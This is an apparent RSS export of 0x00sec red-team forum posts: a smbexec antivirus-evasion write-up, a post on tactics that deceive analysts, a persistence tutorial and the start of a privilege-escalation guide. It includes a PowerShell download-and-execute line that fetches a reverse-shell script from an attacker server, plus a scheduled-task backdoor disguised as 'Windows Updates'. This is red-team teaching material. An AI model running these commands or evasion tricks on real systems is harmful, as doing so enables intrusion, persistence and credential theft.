<p>Now let’s understand what happens when we use these parameters we want to focus on <strong>/Q, /c.</strong> So if we check the help menu from CMD</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/f/e/fe333de237d39321b27950881601ecb429e2bdef.png" alt="" data-base62-sha1="AgL3RRRzAnjQTJe66CsQdrQuthJ" width="690" height="247" role="presentation"></p>
<p>Ok so <strong>/C</strong> carries out the command by string and then it terminates it [this is important], if we run smbexec with this here is the result on Process Explorer:</p>
<p>But if we run it with <strong>/k</strong> carries out the command but remains.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/8/a871ca376fa45b93fdc68d26592440d0e0171be0.png" alt="" data-base62-sha1="o280xMQZAQkXVIoa0vtCKiEzaW4" role="presentation" width="412" height="454"></p>
<p>We have a process, and its running as SYSTEM, damn. No output of course, we gain a shell but we leave a process behind.</p>
<p>But, what other alternatives do we have??. Change the Environment variable and add a slight tweak to the /c parameter, I don’t know why but this works just by adding a (,). I tried to understand it but it seems way over my knowledge cmd is very amazing so much we do not know.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/e/ae48d0919ed53616158f415707ce01bbdf03c35a.png" alt="" data-base62-sha1="oRN5fvJKCR6MPwXJr5Z4FY79iFY" role="presentation" width="607" height="63"></p>
<p><em><strong>[After a while I noticed that the parameter /c was the one being flagged]</strong></em></p>
<p>Now let’s try it.</p>
<p><a href="https://vimeo.com/514543644">A Dive to SMBEXEC - Mute</a></p>

<p>Ok nice video if I say so, but now I am thinking, wait you have Code Execution why are you doing all this crazy stuff?. Why not just execute a PowerShell Command and call your obfuscated, super hidden payload instead of leaving traces behind. Well of course you can do that as well!!.</p>
<p>We have out AV up and running:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/1/11486f24edbe15c9d5c512e77a0c7f5f4929fdf2.png" alt="" data-base62-sha1="2sTj02TTY0QaW5jU5Lh0AmwtbLc" role="presentation" width="555" height="321"></p>
<p>Now let’s move back to our attacking machine and execute our smbexec with our PowerShell command</p>
<p>I setup a listener, my command running smbexec and a python server to call my shell and receive the connection back to my machine.</p>
<p>Listener:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/7/d71458dcc39bc3246b3e8faa288ab3cca2785bc5.png" alt="" data-base62-sha1="uGGftDT8FOOOZ1rST8ghX7w8mGx" role="presentation" width="564" height="182"></p>
<p>Python Server:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/a/ba8ff60842fb08cc903710dec3eb614ec96411d8.png" alt="" data-base62-sha1="qCpfatgdoV7JYiyGI6lkpb2pyBy" role="presentation" width="562" height="171"></p>
<p>SMBEXEC:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/3/5/35d03f7a712338eacfa52b743058cc2786888385.png" alt="" data-base62-sha1="7G3tspVG5PZugqHuoAEryqZZw9L" width="690" height="19" role="presentation"></p>
<pre><code class="lang-auto">cmd.exe /Q /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.20:8000/Connectar-Tcp.ps1');
</code></pre>
<p>Shell:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/5/a/5a24d849b1f7faf90c6d905fa24c632614dbc718.png" alt="" data-base62-sha1="cRrUybJ35jbOPux5Mpq2T02rBXO" width="643" height="342" role="presentation"></p>
<p>Afterwards:</p>
<p>Breaks SMBEXEC</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/7/c/7cec55be4fdabf2ca30f37c6b27464548ce52432.png" alt="" data-base62-sha1="hP7yclv85NrffhqvJhPTAgo1xvQ" width="624" height="187" role="presentation"></p>
<p>After this simple demonstration I wanted to show how some changes to our tools functionality can have us again connected to the user’s network. We have plenty of possibilities to achieve our goal. We just have to think a little bit out of the Box</p>
<p>You can take a look that the AV was only flagging the <strong>/c</strong> parameter and probably anything after that, but once a small difference is added we can see that our code gets executed as there are plenty of methods to achieve this, Hmm maybe replacing it with a LOLBIN???. Who knows but it might be out there.</p>
<p>Keep Learning!!</p>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://dmcxblue.net/2021/02/20/a-dive-on-smbexec/">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d36cc0e86b91ffb045078967592725343b2158d6.jpeg" class="site-icon" data-dominant-color="8A7C77" width="32" height="32">

      <a href="https://dmcxblue.net/2021/02/20/a-dive-on-smbexec/" target="_blank" rel="noopener nofollow ugc" title="08:25AM - 20 February 2021">DMCXBLUE – 20 Feb 21</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:440/151;"><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/0/b0cf08ef352f9e7b08091de42bdc08f5e9d85912.png" class="thumbnail" data-dominant-color="121212" width="440" height="151"></div>

<h3><a href="https://dmcxblue.net/2021/02/20/a-dive-on-smbexec/" target="_blank" rel="noopener nofollow ugc">A Dive on SMBEXEC</a></h3>

  <p>We all know the glorious Impacket tools, very well known in the Cybersecurity Community and hackers among us. Today I will take a look at the Impacket tools. I was recently surprised by how these t…</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p><a href="https://www.youtube.com/watch?v=mej5L9PE1fs">Invoke-DOSfuscation: Techniques FOR %F IN (-style) DO (S-level CMD Obfuscation)</a></p>

            <p><small>8 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/a-dive-on-smbexec/24961">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/a-dive-on-smbexec/24961</link>
          <pubDate>Sat, 20 Feb 2021 17:20:18 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-24961</guid>
          <source url="https://0x00sec.org/t/a-dive-on-smbexec/24961.rss">A Dive on SMBEXEC</source>
        </item>
        <item>
          <title>Red Team - Gitbook 2.0</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>Hi everyone!!.<br>
It been a while, yeah, you know life, bills, pandemic and all the stuff that 2020 left for us. Now about a while back I posted a Gitbook for helping anyone to jump onto the amazing area of Red Team, but man is it difficult to jump to, there are some great resources out there (MITRE, Twitter, Blogs) maybe it was just me but did I had some difficulties trying to find the correct things and get myself in the right direction without losing track of my RED TEAM and well here I am putting my notes updated to the internet to find. It is very beginner friendly and have everything from MITRE with more great images and high level explanations also Videos!!.<br>
I really hope this helps for anyone getting started on this awesome field and trying to Red Team Harder.</p>
<p><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/" rel="noopener nofollow ugc">Red Team Notes 2.0</a></p>
<p>Oh if any mistakes or I forgot to mention some of the great resources I TRIED FINDING, please do let me know. I left the old gitbook also up just reference, hey we all start somewhere. <img src="https://0x00sec.org/images/emoji/twitter/yum.png?v=9" title=":yum:" class="emoji" alt=":yum:"></p>
<p>Thanks!!</p>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/red-team-gitbook-2-0/24701">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/red-team-gitbook-2-0/24701</link>
          <pubDate>Sat, 23 Jan 2021 21:29:08 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-24701</guid>
          <source url="https://0x00sec.org/t/red-team-gitbook-2-0/24701.rss">Red Team - Gitbook 2.0</source>
        </item>
        <item>
          <title>Innovative Red Team Tactics</title>
          <dc:creator><![CDATA[hunter]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>Hello 0x00sec, long time no see!</p>
<p>Today I decided to start a discussion around innovative Red Team TTP’s we have encountered or used.</p>
<p>For those who are not familiar with the concept; RT and Pentest methodologies have different goals in mind. Despite using similar methods, they answer different questions.</p>
<blockquote>
<p><strong>PT Questions:</strong> Can my infrastructure be hacked? If so, <em>how?</em><br>
<strong>PT Goals:</strong> Discovery of various <em>attack paths</em> into a system. (The concept of “attack path” is the nuance between a PT and a Vulnerability Assessment. VA focus on singular vulnerabilities, whereas PT focus on exploiting vulnerabilities towards a specific <em>impact.</em> This act of exploitation is called an “attack path”.)</p>
</blockquote>
<blockquote>
<p><strong>RT Questions:</strong> Am I prepared against real world attacks? <em>Can I detect</em> when I’m being attacked? <em>Can I stop it</em> before it causes any damage?<br>
<strong>RT Goals:</strong> Emulating or simulating various type of <em>threats</em> and measuring the efficiency of incident detection and response process.</p>
</blockquote>
<p>I think the subject of this discussion is more clear now. When talking about Red Team TTP’s <strong>we’re NOT</strong> talking about: pentesting tools, attack techniques, exploits, RATs or crypters (unless the technique is novel).</p>
<h2>TTP 1: Using “Unquoted Service Paths” to mislead analysts</h2>
<p>If you’re going to deploy your backdoor as a new service, leverage “unquoted service path” to confuse detection systems and the SOC.</p>
<blockquote>
<p>Service path: C:\Program Files\decoymalware.exe<br>
Real malware: C:\Program.exe</p>
</blockquote>
<p>You could use <em>decoymalware.exe</em> as a means to deceive security operators. Maybe put a legitimate and signed binary there so when your new service is discovered and binary is uploaded to VT it would seem completely innocent and the alert might get disregarded as a false positive.</p>
<p>Or if its likely that this will be further investigated you could put a completely irrelevant malware to mislead. A known cryptominer maybe? It is malicious but not really that important so the alert regarding to your backdoor will be quickly “resolved”.</p>
<h2>TTP 2: Using Remote Drive Mapping to steal NTLM hashes</h2>
<p>In several investigations I came across LNK files pointing to remote smb paths. Their purpose was to force the client to authenticate with the attacker’s smb server. Thus, the attacker could steal the victim’s NTLM hash. I found this usage of RDM’s innovative.</p>
<h2>TTP 3: DNS Poisoning and Injecting into Google Analytics JS</h2>
<p>Now think about the browsing activity of a normal user. Probably more than half of the webpages he’ll visit will be requesting JS files from Google Analytics. So if you can somehow redirect these requests to your own webserver (by DNS poisoning, or MITM, or sth else) and replace these JS files, you will have the perfect C2 system for your malware! Your malware won’t have to send even a single TCP packet. The browsing activity of your victim will be the carrier of your messages and it will be frequent enough! <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"></p>
<p>What are your favorite Red Team TTP’s? Please write them below <img src="https://0x00sec.org/images/emoji/twitter/point_down.png?v=9" title=":point_down:" class="emoji" alt=":point_down:"></p>
            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/innovative-red-team-tactics/22999">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/innovative-red-team-tactics/22999</link>
          <pubDate>Sat, 05 Sep 2020 13:30:07 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-22999</guid>
          <source url="https://0x00sec.org/t/innovative-red-team-tactics/22999.rss">Innovative Red Team Tactics</source>
        </item>
        <item>
          <title>Persistence Techniques</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d36cc0e86b91ffb045078967592725343b2158d6.jpeg" class="site-icon" width="32" height="32">
      <a href="https://dmcxblue.net/2020/07/28/persistence-techniques/" target="_blank" rel="noopener nofollow ugc" title="01:05AM - 29 July 2020">DMCXBLUE – 29 Jul 20</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:439/236;"><img src="https://mydmcxblue.files.wordpress.com/2020/07/image-10.png?fit=440%2C330" class="thumbnail" width="439" height="236"></div>

<h3><a href="https://dmcxblue.net/2020/07/28/persistence-techniques/" target="_blank" rel="noopener nofollow ugc">Persistence Techniques</a></h3>

<p>Today I will talk about persistence, the technique used by adversaries to maintain their foothold on your network. It mainly consists of techniques used by adversaries to keep access to systems acr…</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Today I will talk about persistence, the technique used by adversaries to maintain their foothold on your network. It mainly consists of techniques used by adversaries to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.</p>
<p>Many tools are great for these techniques and I will demonstrate a few simple one’s to get started you can always research for more advance methods and techniques, and probably other tools than can aid in being stealthy across the Network. Try to learn as many methods as possible with a C2 and without it. Most commonly since you are a Red Teamer you will be using some sort of C2 for your Shells.</p>
<p>I am not trying to be stealthy here I will just demonstrate the ways we can keep our Access onto the System.</p>
<p>I will work with some very easy ones, some of these samples you can find on my <a href="https://dmcxblue.gitbook.io/red-team-notes/" rel="noopener nofollow ugc">GitBook</a>, MITRE and other great sources .</p>
<p>I will work with a regular shell but try to learn this as well to keep your persistence using a C2. I will start with a Simple One.</p>
<p><strong>Shortcut Links</strong></p>
<p>The easiest to work with and sometimes very effective, workers rely on Shortcut Links or sometimes have no idea that they create this, to access their files “Faster” (for what I  heard) so why not trick them to running our Shell and Execute code.</p>
<p>It’s easy to follow in this Method.</p>
<p>Right-Click &gt;&gt; New &gt;&gt; Shortcut</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5d16989f37b531665c927ee42909e5c131b82557.png" alt="" data-base62-sha1="dhuODWyAOg4LI3J6yb6b0EnIXob" width="566" height="304"></p>
<p>Then Right Click &gt;&gt; Properties &gt;&gt; Add your Code Here</p>
<p>Optional: You can change the “Start in:” and your Shell will start in that Directory. To change the Icon just Change Icon &gt;&gt; Find the Path for the ICO file and Select then you are good to go.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/25afcee4f8109a71b1cac67d40ac86b02171d28b.png" data-download-href="/uploads/short-url/5nokGJxF1FewomoR2fy3P2ioTCr.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/25afcee4f8109a71b1cac67d40ac86b02171d28b_2_464x499.png" alt="" data-base62-sha1="5nokGJxF1FewomoR2fy3P2ioTCr" width="464" height="499" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/25afcee4f8109a71b1cac67d40ac86b02171d28b_2_464x499.png, https://0x00sec.s3.amazonaws.com/original/2X/2/25afcee4f8109a71b1cac67d40ac86b02171d28b.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/2/25afcee4f8109a71b1cac67d40ac86b02171d28b.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/25afcee4f8109a71b1cac67d40ac86b02171d28b_2_10x10.png"></a></div><p></p>
<p>Once it’s clicked you will gain a Shell and their Link just won’t do anything “Almost” in the background it will execute a PowerShell command to call your Shell in Memory.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f3332bf9725112a38ebc6bb8e6c12c05932fb9d4.png" data-download-href="/uploads/short-url/yHrEWlQRdaqJCj2kwzb4SQkTGja.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f3332bf9725112a38ebc6bb8e6c12c05932fb9d4_2_690x238.png" alt="" data-base62-sha1="yHrEWlQRdaqJCj2kwzb4SQkTGja" width="690" height="238" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f3332bf9725112a38ebc6bb8e6c12c05932fb9d4_2_690x238.png, https://0x00sec.s3.amazonaws.com/original/2X/f/f3332bf9725112a38ebc6bb8e6c12c05932fb9d4.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/f/f3332bf9725112a38ebc6bb8e6c12c05932fb9d4.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f3332bf9725112a38ebc6bb8e6c12c05932fb9d4_2_10x10.png"></a></div><p></p>
<p>Perfect the Command executed and gain us our Connection. No Flags, No AV. Very easy to use and have a quick Persistence technique running on the Target System. A quick and Simple Technique yet effective when applied correctly on environments that can be easily tricked.</p>
<p><strong>Scheduled Tasks</strong></p>
<p>Another great method to gain Persistence on the Target Machine it’s great since this is another method that does not require any High Privileges such as Administrator or SYSTEM. You can work with a User permission scheduled task an still have Persistence, these are easy to work with but the majority would like to have Persistence as an Administrator on the System but let’s create a quick show on how to keep our Access using a Scheduled Task.</p>
<p>The great thing about this is you can have the Task execute commands or executables whichever you prefer in this occasion I will use a Binary which will call my Payload in PowerShell to keep Myself in Memory as well.</p>
<p>First I will need to Drop my Binary onto the System, use any method here that you are more familiar with usually C2’s can help or many of the LOLBINS available to execute this, I will simply use PowerShell <strong>Invoke-WebRequest.</strong></p>
<p>To create a task we use the following command:</p>
<pre><code class="lang-auto">schtasks /create /sc minute /mo 1 /tn "Windows Updates" /tr "PATH"
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8ce199d9c95589897ce1d0d6b1f3fa9cfd9d2a32.png" alt="" data-base62-sha1="k6ic0HMbFSwJdtdiPkUCIeAtjGy" width="644" height="212"></p>
<p>I verify my task named Updater and I can tell it was successfully created to run every 1 Minute. I will go back to my Attacker Box and start a listener on the Port that I know my Payload will connect back to.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/b/b891b4d7bb54c22655928dd011852904b5231a28.gif" data-download-href="/uploads/short-url/qkM1NWkaz72Fbaru6bHAFCs1JC8.gif?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b891b4d7bb54c22655928dd011852904b5231a28_2_690x275.gif" alt="" data-base62-sha1="qkM1NWkaz72Fbaru6bHAFCs1JC8" width="690" height="275" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b891b4d7bb54c22655928dd011852904b5231a28_2_690x275.gif, https://0x00sec.s3.amazonaws.com/original/2X/b/b891b4d7bb54c22655928dd011852904b5231a28.gif 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/b/b891b4d7bb54c22655928dd011852904b5231a28.gif 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b891b4d7bb54c22655928dd011852904b5231a28_2_10x10.png"></a></div><p></p>
<p>And that easy a Persistence Shell with User Privileges by creating a simple scheduled task running every minute to call our Payload and Connect to our Specified Port (Running in Memory as well as this C# Binary calls PowerShell and uses and Obfuscated Payload to do all this, no need to do this as I am only teaching Basics).</p>
<p><strong>PowerShell Profiles</strong></p>
<p>PowerShell Profile is a PowerShell script which you can customize to your environment and add session specific elements to every PowerShell session that you Start.</p>
<p>Its a script that runs when PowerShell starts. You can use profiles as a logon script to customize the environment. You can add Commands, Functions, Aliases, Modules, etc.</p>
<p>PowerShell supports several profile files. Also, PowerShell host programs can support their own host-specific profiles.</p>
<p>A few Samples:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/c/c23472e787cf2350c481e5b33d0565fba2ec0b5a.png" data-download-href="/uploads/short-url/rI101xlKAxG9LxIvBaUISC1cLd8.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c23472e787cf2350c481e5b33d0565fba2ec0b5a.png" alt="" data-base62-sha1="rI101xlKAxG9LxIvBaUISC1cLd8" width="690" height="205" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c23472e787cf2350c481e5b33d0565fba2ec0b5a_2_10x10.png"></a></div><p></p>
<p>The PowerShell profile script is stored in the folder <strong>“WindowsPowerShel”</strong> which is by default is hidden from the user. If a payload has been dropped into disk the “ <strong>Start-Process</strong> ” cmdlet can be used to point to the location of the Executable. The “Test-Path” determines if a profile exists for the current user. If the profile doesn’t exist the Command “ <strong>New-Item -Path $Profile -Type File -Force</strong> ” will create a profile for the current users and the “ <strong>Out-File</strong> ” will rewrite the profile.</p>
<p>First let’s create a Profile:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f48da1c555eecfd035903f6da780f5e0ac40ee49.png" data-download-href="/uploads/short-url/yTpWLeQFR7sfl3FKbkFDeasbOCB.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f48da1c555eecfd035903f6da780f5e0ac40ee49.png" alt="" data-base62-sha1="yTpWLeQFR7sfl3FKbkFDeasbOCB" width="690" height="245" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f48da1c555eecfd035903f6da780f5e0ac40ee49_2_10x10.png"></a></div><p></p>
<p>Then I will add the command I want to be executed when a New PowerShell Session is initiated.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/3/36e11edd8b2ba22eb5f60a8ce8eae945d7baa1ca.png" data-download-href="/uploads/short-url/7Pu6k4FZEXxdwP4yM3eRw7c5mtQ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/36e11edd8b2ba22eb5f60a8ce8eae945d7baa1ca.png" alt="" data-base62-sha1="7Pu6k4FZEXxdwP4yM3eRw7c5mtQ" width="690" height="102" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/36e11edd8b2ba22eb5f60a8ce8eae945d7baa1ca_2_10x10.png"></a></div><p></p>
<p>Now every New PowerShell will run my Executable Command and connect back to my Attacking Machine.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/8/8044bced7d01ccf6a6af5a5b9ae546ec5f9e5415.gif" data-download-href="/uploads/short-url/iiInYtB1k2yJsvwHdmzCP2uUG3j.gif?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8044bced7d01ccf6a6af5a5b9ae546ec5f9e5415_2_690x383.gif" alt="" data-base62-sha1="iiInYtB1k2yJsvwHdmzCP2uUG3j" width="690" height="383" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8044bced7d01ccf6a6af5a5b9ae546ec5f9e5415_2_690x383.gif, https://0x00sec.s3.amazonaws.com/original/2X/8/8044bced7d01ccf6a6af5a5b9ae546ec5f9e5415.gif 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/8/8044bced7d01ccf6a6af5a5b9ae546ec5f9e5415.gif 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8044bced7d01ccf6a6af5a5b9ae546ec5f9e5415_2_10x10.png"></a></div><p></p>
<p>Runs every Second <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
<p>These are just a few demonstrations that I wanted to share they are simple and very easy to follow, If you would love to go more into Detail please do check out the MITRE FrameWork as it’s a great guide to understand and check out various techniques used by APT’s.</p>
<p>Keep hacking!!</p>
<p>References:</p>
<p><a href="https://pentestlab.blog/2019/11/05/persistence-powershell-profile/" rel="noopener nofollow ugc">Persistence – PowerShell Profile</a></p>
            <p><small>5 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/persistence-techniques/22470">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/persistence-techniques/22470</link>
          <pubDate>Wed, 29 Jul 2020 01:08:31 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-22470</guid>
          <source url="https://0x00sec.org/t/persistence-techniques/22470.rss">Persistence Techniques</source>
        </item>
        <item>
          <title>Privilege Escalation</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d36cc0e86b91ffb045078967592725343b2158d6.jpeg" class="site-icon" width="32" height="32">
      <a href="https://dmcxblue.net/" target="_blank" rel="noopener nofollow ugc">DMCXBLUE</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6623899f9ff113725012267e1559f59940bc3f44.jpeg" class="thumbnail onebox-avatar" width="200" height="200">

<h3><a href="https://dmcxblue.net/" target="_blank" rel="noopener nofollow ugc">DMCXBLUE</a></h3>

<p>Red Teaming, Web Apps, General Pentesting and Thoughts</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>In today’s Episode of Red-Teaming we will talk about Privilege Escalation a valuable Technique when trying to gain higher privileges on a machine, we want to achieve this Goal because we want UNRESTRICTED access onto the machine we are targeting. In this part the APT is trying to gain higher privileges on the Machine</p>
<p>There have been various great talks and blogs about this part of Red-Teaming they are well documented, and so many incredible tools that can be used to achieve this Goal. I will work with a few well known tools. Some of these are written for our famous PowerShell, others in C# and then with Python.</p>
<p><strong>1.- Files</strong></p>
<p>Let’s not go too far, by experience or CTF’s sometimes the passwords are in Plain Sight no need to use fancy exploitation methods or Capture Hashes and none of that sort. Why not just search a file named <strong>Passwords.xlsx.</strong> Yes these famous files do exist, they can be on the machine, on a share or even right on the Desktop. And let’s not forget these can be Word Documents, Text Files, or anything that can hold passwords.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/c/c4bc47a2b92769410206f64eb53a814e4134e81b.png" data-download-href="/uploads/short-url/s4oYfTlijlKSTWZ6ykFC50IKKbF.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c4bc47a2b92769410206f64eb53a814e4134e81b_2_690x355.png" alt="" data-base62-sha1="s4oYfTlijlKSTWZ6ykFC50IKKbF" width="690" height="355" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c4bc47a2b92769410206f64eb53a814e4134e81b_2_690x355.png, https://0x00sec.s3.amazonaws.com/original/2X/c/c4bc47a2b92769410206f64eb53a814e4134e81b.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/c/c4bc47a2b92769410206f64eb53a814e4134e81b.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c4bc47a2b92769410206f64eb53a814e4134e81b_2_10x10.png"></a></div><p></p>
<p>But of course unless you have a Cheat Sheet with all these fancy commands to search for these files, why not use an already created awesome tool. That can search for these files in a fast manner and even faster if it’s an SSD.</p>
<p><strong>2.- Tools</strong></p>
<p><em>Sauron Eye</em></p>
<p>First awesome tool in our list in its Gihub Repo it is said:</p>
<p>SauronEye is a search tool built to aid red teams in finding files containing specific keywords.</p>
<p><strong>Features</strong> :</p>
<ul>
<li>Search multiple (network) drives</li>
<li>Search contents of files</li>
<li>Search contents of Microsoft Office files (.doc, .docx, .xls, .xlsx)</li>
<li>Find VBA macros in old 2003 .xls and .doc files</li>
<li>Search multiple drives multi-threaded for increased performance</li>
<li>Supports regular expressions in search keywords</li>
<li>Compatible with Cobalt Strike’s execute-assembly</li>
</ul>
<p>It’s also quite fast, can do 50k files, totaling 1,3 TB on a network drive in under a minute (with realistic file filters). Searches a C:\ (on a cheap SATA SSD) in about 15 seconds.</p>
<p>Let’s work with this tool we have our shell and we will need to upload the Binary onto the machine (Yes!! Poor Opsec, but it’s just a Demo).</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3435fcdc4e27e5c2bd673d7acb497918b264fe67.png" alt="" data-base62-sha1="7rSuN8VbltN3A6ho9wheL2HVyHd" width="628" height="302"></p>
<p>Let’s search for these password files</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/b/b3b91b1656e9c3b64a94d78d57827f67cb9b8ed8.gif" data-download-href="/uploads/short-url/pDU3nNzDoxR5QMAKDoAy5Qi0DGM.gif?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b3b91b1656e9c3b64a94d78d57827f67cb9b8ed8_2_690x367.gif" alt="" data-base62-sha1="pDU3nNzDoxR5QMAKDoAy5Qi0DGM" width="690" height="367" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b3b91b1656e9c3b64a94d78d57827f67cb9b8ed8_2_690x367.gif, https://0x00sec.s3.amazonaws.com/original/2X/b/b3b91b1656e9c3b64a94d78d57827f67cb9b8ed8.gif 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/b/b3b91b1656e9c3b64a94d78d57827f67cb9b8ed8.gif 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b3b91b1656e9c3b64a94d78d57827f67cb9b8ed8_2_10x10.png"></a></div><p></p>
<p>Oh yes, in just seconds it crawled the entire C:\ directory and its sub-directories and managed to found plenty of files, one is our Password.txt file that I moved to the Documents folder, what and amazing Tool. With that password we can use tools such as CrackMapExec to capture shells as Administrators</p>
<p><em>SharpUp</em></p>
<p>Another amazing tool.</p>
<p>SharpUp is a C# port of various <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1" rel="noopener nofollow ugc">PowerUp</a> functionality. Currently, only the most common checks have been ported; no weaponize functions have yet been implemented.</p>
<p>This tool comes in an awesome package named GhostPack highly active and frequently updated to keep up with the .NET Framework incompatibilities.</p>
<p>The thought about this tool is that we can also use it’s PowerShell Brother in case .NET isn’t available or the proper version for it to run. If by any chance you downloaded the incorrect one but let’s focus on the C# one.</p>
<p>The syntax for this one is very simple:</p>
